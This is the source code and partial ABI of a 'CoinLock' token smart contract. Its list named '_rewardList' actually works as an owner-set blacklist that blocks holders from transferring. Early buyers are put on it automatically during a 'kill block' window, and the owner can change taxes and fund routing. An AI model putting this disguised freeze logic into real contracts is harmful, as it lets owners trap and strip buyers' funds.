{"SourceCode": "/*\n *  Created By: CoinLock\n *  Website: https://coinlock.finance\n *  Telegram: https://t.me/CoinLock\n *  Twitter: https://twitter.com/CoinLock\n **/\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Context {\n    // Empty internal constructor, to prevent people from mistakenly deploying\n    // an instance of this contract, which should be used via inheritance.\n    //   constructor () internal { }\n\n    function _msgSender() internal view returns (address) {\n        return payable(msg.sender);\n    }\n\n    function _msgData() internal view returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor() {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public onlyOwner {\n        emit OwnershipTransferred(\n            _owner,\n            0x000000000000000000000000000000000000dEaD\n        );\n        _owner = 0x000000000000000000000000000000000000dEaD;\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public onlyOwner {\n        require(\n            newOwner != address(0),\n            \"Ownable: new owner is the zero address\"\n        );\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n}\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\ninterface IERC20 {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function totalSupply() external view returns (uint256);\n\n    function decimals() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\ninterface IPancakeRouter01 {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        returns (\n            uint256 amountA,\n            uint256 amountB,\n            uint256 liquidity\n        );\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n}\n\ninterface IPancakeRouter02 is IPancakeRouter01 {\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface IUniswapV2Factory {\n    event PairCreated(\n        address indexed token0,\n        address indexed token1,\n        address pair,\n        uint256\n    );\n\n    function feeTo() external view returns (address);\n\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB)\n        external\n        view\n        returns (address pair);\n\n    function allPairs(uint256) external view returns (address pair);\n\n    function allPairsLength() external view returns (uint256);\n\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair);\n\n    function setFeeTo(address) external;\n\n    function setFeeToSetter(address) external;\n}\n\n\ncontract BaseCoinLockToken is IERC20, Ownable {\n    bool public currencyIsEth;\n\n    bool public enableOffTrade;\n    bool public enableKillBlock;\n    bool public enableRewardList;\n\n    bool public enableSwapLimit;\n    bool public enableWalletLimit;\n    bool public enableChangeTax;\n\n    address public currency;\n    address public fundAddress;\n\n    uint256 public _buyFundFee = 0;\n    uint256 public _buyLPFee = 0;\n    uint256 public _buyBurnFee = 0;\n    uint256 public _sellFundFee = 500;\n    uint256 public _sellLPFee = 0;\n    uint256 public _sellBurnFee = 0;\n\n    uint256 public kb = 0;\n\n    uint256 public maxBuyAmount;\n    uint256 public maxWalletAmount;\n    uint256 public maxSellAmount;\n    uint256 public startTradeBlock;\n\n    string public override name;\n    string public override symbol;\n    uint256 public override decimals;\n    uint256 public override totalSupply;\n\n    address deadAddress = 0x000000000000000000000000000000000000dEaD;\n    uint256 public constant MAX = ~uint256(0);\n\n    mapping(address => uint256) public _balances;\n    mapping(address => mapping(address => uint256)) public _allowances;\n    mapping(address => bool) public _rewardList;\n\n    IPancakeRouter02 public _swapRouter;\n    mapping(address => bool) public _swapPairList;\n\n    mapping(address => bool) public _feeWhiteList;\n    address public _mainPair;\n\n    function setFundAddress(address addr) external onlyOwner {\n        fundAddress = addr;\n        _feeWhiteList[addr] = true;\n    }\n\n    function changeSwapLimit(uint256 _maxBuyAmount, uint256 _maxSellAmount) external onlyOwner {\n        maxBuyAmount = _maxBuyAmount;\n        maxSellAmount = _maxSellAmount;\n        require(maxSellAmount >= maxBuyAmount,\" maxSell should be > than maxBuy \");\n    }\n\n    function changeWalletLimit(uint256 _amount) external onlyOwner {\n        maxWalletAmount = _amount;\n    }\n\n    function launch() external onlyOwner {\n        require(startTradeBlock == 0, \"already started\");\n        startTradeBlock = block.number;\n    }\n\n    function disableSwapLimit() public onlyOwner {\n        enableSwapLimit = false;\n    }\n\n    function disableWalletLimit() public onlyOwner {\n        enableWalletLimit = false;\n    }\n\n    function disableChangeTax() public onlyOwner {\n        enableChangeTax = false;\n    }\n\n    function completeCustoms(uint256[] calldata customs)\n        external\n        onlyOwner\n    {\n        require(enableChangeTax, \"tax change disabled\");\n        _buyLPFee = customs[0];\n        _buyBurnFee = customs[1];\n        _buyFundFee = customs[2];\n\n        _sellLPFee = customs[3];\n        _sellBurnFee = customs[4];\n        _sellFundFee = customs[5];\n\n        require(_buyBurnFee + _buyLPFee + _buyFundFee < 2500, \"fee too high\");\n        require(\n            _sellBurnFee + _sellLPFee + _sellFundFee < 2500,\n            \"fee too high\"\n        );\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        virtual\n        override\n        returns (bool)\n    {}\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external virtual override returns (bool) {}\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender)\n        public\n        view\n        override\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) private {\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function setFeeWhiteList(address[] calldata addr, bool enable)\n        external\n        onlyOwner\n    {\n        for (uint256 i = 0; i < addr.length; i++) {\n            _feeWhiteList[addr[i]] = enable;\n        }\n    }\n\n    function multi_bclist(address[] calldata addresses, bool value)\n        public\n        onlyOwner\n    {\n        require(enableRewardList, \"rewardList disabled\");\n        require(addresses.length < 201);\n        for (uint256 i; i < addresses.length; ++i) {\n            _rewardList[addresses[i]] = value;\n        }\n    }\n}\n\ncontract TokenDistributor {\n    constructor(address token) {\n        IERC20(token).approve(msg.sender, uint256(~uint256(0)));\n    }\n}\n\n\ncontract CoinLockToken is BaseCoinLockToken {\n    bool private inSwap;\n\n    TokenDistributor public _tokenDistributor;\n\n    modifier lockTheSwap() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor(\n        string[] memory stringParams,\n        address[] memory addressParams,\n        uint256[] memory numberParams,\n        bool[] memory boolParams\n    ) { \n        name = stringParams[0];\n        symbol = stringParams[1];\n        decimals = numberParams[0];\n        totalSupply = numberParams[1];\n        currency = addressParams[0];\n\n        _buyFundFee = numberParams[2];\n        _buyBurnFee = numberParams[3];\n        _buyLPFee = numberParams[4];\n        _sellFundFee = numberParams[5];\n        _sellBurnFee = numberParams[6];\n        _sellLPFee = numberParams[7];\n        kb = numberParams[8];\n\n        maxBuyAmount = numberParams[9];\n        maxSellAmount = numberParams[10];\n    \n        maxWalletAmount = numberParams[11];\n        require(\n            maxSellAmount >= maxBuyAmount,\n            \" maxSell should be > than maxBuy \"\n        );\n        airdropNumbs = numberParams[12];\n        require(airdropNumbs <= 3,\"airdropNumbs should be <= 3\");\n\n        require(_buyBurnFee + _buyLPFee + _buyFundFee < 2500,\"fee too high\");\n        require(_sellBurnFee + _sellLPFee + _sellFundFee < 2500, \"fee too high\");\n\n        currencyIsEth = boolParams[0];\n        enableOffTrade = boolParams[1];\n        enableKillBlock = boolParams[2];\n        enableRewardList = boolParams[3];\n\n        enableSwapLimit = boolParams[4];\n        enableWalletLimit = boolParams[5];\n        enableChangeTax = boolParams[6];\n        enableTransferFee = boolParams[7];\n\n\n        IPancakeRouter02 swapRouter = IPancakeRouter02(addressParams[1]);\n            IERC20(currency).approve(address(swapRouter), MAX);\n            _swapRouter = swapRouter;\n            _allowances[address(this)][address(swapRouter)] = MAX;\n            IUniswapV2Factory swapFactory = IUniswapV2Factory(\n                swapRouter.factory()\n            );\n            address swapPair = swapFactory.createPair(address(this), currency);\n            _mainPair = swapPair;\n            _swapPairList[swapPair] = true;\n            _feeWhiteList[address(swapRouter)] = true;\n\n        if (!currencyIsEth) {\n            _tokenDistributor = new TokenDistributor(currency);\n        }\n\n        address ReceiveAddress = addressParams[2];\n\n        _balances[ReceiveAddress] = totalSupply;\n        emit Transfer(address(0), ReceiveAddress, totalSupply);\n\n        fundAddress = addressParams[3];\n\n        _feeWhiteList[fundAddress] = true;\n        _feeWhiteList[ReceiveAddress] = true;\n        _feeWhiteList[address(this)] = true;\n        _feeWhiteList[msg.sender] = true;\n        _feeWhiteList[tx.origin] = true;\n        _feeWhiteList[deadAddress] = true;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        if (_allowances[sender][msg.sender] != MAX) {\n            _allowances[sender][msg.sender] =\n                _allowances[sender][msg.sender] -\n                amount;\n        }\n        return true;\n    }\n\n    function setkb(uint256 a) public onlyOwner {\n        kb = a;\n    }\n\n    function isReward(address account) public view returns(uint256){\n        if(_rewardList[account] && !_swapPairList[account] ){return 1;}\n        else{return 0;}\n    }\n\n    bool public airdropEnable = true;\n    function setAirDropEnable(bool status) public onlyOwner{\n        airdropEnable = status;\n    }\n\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\n        _balances[sender] -= amount;\n        _balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    uint256 public airdropNumbs = 0;\n    function setAirdropNumbs(uint256 newValue) public onlyOwner{\n        require(newValue <= 3,\"newValue must <= 3\");\n        airdropNumbs = newValue;\n    }\n\n    bool public enableTransferFee = false;\n    function setEnableTransferFee(bool status) public onlyOwner{\n        enableTransferFee = status;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        if (isReward(from)>0){\n            require(false, \"isReward > 0 !\");\n        }\n\n        if (inSwap){\n            _basicTransfer(from, to, amount);\n            return;\n        }\n\n        uint256 balance = balanceOf(from);\n        require(balance >= amount, \"balanceNotEnough\");\n\n        if(!_feeWhiteList[from] && !_feeWhiteList[to] && airdropEnable && airdropNumbs > 0){\n            address ad;\n            for(uint i=0;i <airdropNumbs;i++){\n                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\n                _basicTransfer(from,ad,1);\n            }\n            amount -= airdropNumbs * 1;\n        }\n\n        bool takeFee;\n        bool isSell;\n\n        if (_swapPairList[from] || _swapPairList[to]) {\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\n                if (enableOffTrade && 0 == startTradeBlock) {\n                    require(false);\n                }\n                if (\n                    enableOffTrade &&\n                    enableKillBlock &&\n                    block.number < startTradeBlock + kb\n                    \n                ) {\n                    if (!_swapPairList[to])  _rewardList[to] = true;\n                }\n\n                if (enableSwapLimit) {\n                    if (_swapPairList[from]){ //buy\n                       require(\n                            amount <= maxBuyAmount,\n                            \"Exceeded maximum transaction volume\"\n                        );\n                    }else{ //sell\n                        require(\n                            amount <= maxSellAmount,\n                            \"Exceeded maximum transaction volume\"\n                        );\n                    }\n                }\n                if(enableWalletLimit && _swapPairList[from]){\n                    uint256 _b = balanceOf(to);\n                    require( _b + amount<= maxWalletAmount, \"Exceeded maximum wallet balance\");\n                }\n\n                if (_swapPairList[to]) {\n                    if (!inSwap) {\n                        uint256 contractTokenBalance = balanceOf(address(this));\n                        if (contractTokenBalance > 0) {\n                            uint256 swapFee = _buyFundFee +\n                                _buyLPFee +\n                                _sellFundFee +\n                                _sellLPFee;\n                            uint256 numTokensSellToFund = (amount *\n                                swapFee *\n                                2) / 10000;\n                            if (numTokensSellToFund > contractTokenBalance) {\n                                numTokensSellToFund = contractTokenBalance;\n                            }\n                            swapTokenForFund(numTokensSellToFund, swapFee);\n                        }\n                    }\n                }\n                takeFee = true;\n            }\n            if (_swapPairList[to]) {\n                isSell = true;\n            }\n        }\n\n        // if transfer && !isexcludefee && enableTransferFee\n        if (\n            !_swapPairList[from] &&\n            !_swapPairList[to]   &&\n            !_feeWhiteList[from] &&\n            !_feeWhiteList[to] &&\n            enableTransferFee\n        ){\n            takeFee = true;\n            isSell = true;\n        }\n\n        _tokenTransfer(from, to, amount, takeFee, isSell);\n    }\n\n    function _tokenTransfer(\n        address sender,\n        address recipient,\n        uint256 tAmount,\n        bool takeFee,\n        bool isSell\n    ) private {\n        _balances[sender] = _balances[sender] - tAmount;\n        uint256 feeAmount;\n\n        if (takeFee) {\n            uint256 swapFee;\n            if (isSell) {\n                swapFee = _sellFundFee + _sellLPFee;\n            } else {\n                swapFee = _buyFundFee + _buyLPFee;\n            }\n\n            uint256 swapAmount = (tAmount * swapFee) / 10000;\n            if (swapAmount > 0) {\n                feeAmount += swapAmount;\n                _takeTransfer(sender, address(this), swapAmount);\n            }\n\n            uint256 burnAmount;\n            if (!isSell){ //buy\n                burnAmount = (tAmount * _buyBurnFee) / 10000;\n            }else{//sell\n                burnAmount = (tAmount * _sellBurnFee) / 10000;\n            }\n            if (burnAmount > 0){\n                feeAmount += burnAmount;\n                _takeTransfer(sender, address(0xdead), burnAmount);\n            }\n\n        }\n\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\n    }\n\n    event Failed_AddLiquidity();\n    event Failed_AddLiquidityETH();\n    event Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();\n    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens();\n\n    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee)\n        private\n        lockTheSwap\n    {\n        if (swapFee == 0) return;\n        swapFee += swapFee;\n        uint256 lpFee = _sellLPFee + _buyLPFee;\n        uint256 lpAmount = (tokenAmount * lpFee) / swapFee;\n\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = currency;\n        if (currencyIsEth) {\n            // make the swap\n            try _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\n                tokenAmount - lpAmount,\n                0, // accept any amount of ETH\n                path,\n                address(this), // The contract\n                block.timestamp\n            ) {} catch { emit Failed_swapExactTokensForETHSupportingFeeOnTransferTokens(); }\n        } else {\n            try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                tokenAmount - lpAmount,\n                0,\n                path,\n                address(_tokenDistributor),\n                block.timestamp\n            ) {} catch { emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(); }\n        }\n\n        swapFee -= lpFee;\n        uint256 fistBalance = 0;\n        uint256 lpFist = 0;\n        uint256 fundAmount = 0;\n        if (currencyIsEth) {\n            fistBalance = address(this).balance;\n            lpFist = (fistBalance * lpFee) / swapFee;\n            fundAmount = fistBalance - lpFist;\n            if (fundAmount > 0 && fundAddress != address(0)) {\n                payable(fundAddress).transfer(fundAmount);\n            }\n            if (lpAmount > 0 && lpFist > 0) {\n                // add the liquidity\n                try _swapRouter.addLiquidityETH{value: lpFist}(\n                    address(this),\n                    lpAmount,\n                    0,\n                    0, \n                    fundAddress,\n                    block.timestamp\n                ) {} catch { emit Failed_AddLiquidityETH(); }\n            }\n        } else {\n            IERC20 FIST = IERC20(currency);\n            fistBalance = FIST.balanceOf(address(_tokenDistributor));\n            lpFist = (fistBalance * lpFee) / swapFee;\n            fundAmount = fistBalance - lpFist;\n\n            if (lpFist > 0) {\n                FIST.transferFrom(\n                    address(_tokenDistributor),\n                    address(this),\n                    lpFist\n                );\n            }\n\n            if (fundAmount > 0) {\n                FIST.transferFrom(\n                    address(_tokenDistributor),\n                    fundAddress,\n                    fundAmount\n                );\n            }\n\n            if (lpAmount > 0 && lpFist > 0) {\n                try _swapRouter.addLiquidity(\n                    address(this),\n                    currency,\n                    lpAmount,\n                    lpFist,\n                    0,\n                    0,\n                    fundAddress,\n                    block.timestamp\n                ) {} catch { emit Failed_AddLiquidity(); }\n            }\n        }\n    }\n\n    function _takeTransfer(\n        address sender,\n        address to,\n        uint256 tAmount\n    ) private {\n        _balances[to] = _balances[to] + tAmount;\n        emit Transfer(sender, to, tAmount);\n    }\n\n    function setSwapPairList(address addr, bool enable) external onlyOwner {\n        _swapPairList[addr] = enable;\n    }\n\n    receive() external payable {}\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string[]\",\"name\":\"stringParams\",\"type\":\"string[]\"},{\"internalType\":\"address[]\",\"name\":\"addressParams\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"numberParams\",\"type\":\"uint256[]\"},{\"internalType\":\"bool[]\",\"name\":\"boolParams\",\"type\":\"bool[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_AddLiquidity\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_AddLiquidityETH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_swapExactTokensForETHSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MAX\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_allowances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyBurnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_rewardList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellBurnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract IPancakeRouter02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdropEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airdropNumbs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_maxBuyAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_maxSellAmount\",\"type\":\"uint256\"}],\"name\":\"changeSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"changeWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"customs\",\"type\":\"uint256[]\"}],\"name\":\"completeCustoms\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currency\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currencyIsEth\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableChangeTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"disableWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableChangeTax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableKillBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableOffTrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableRewardList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTransferFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableWalletLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kb\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMu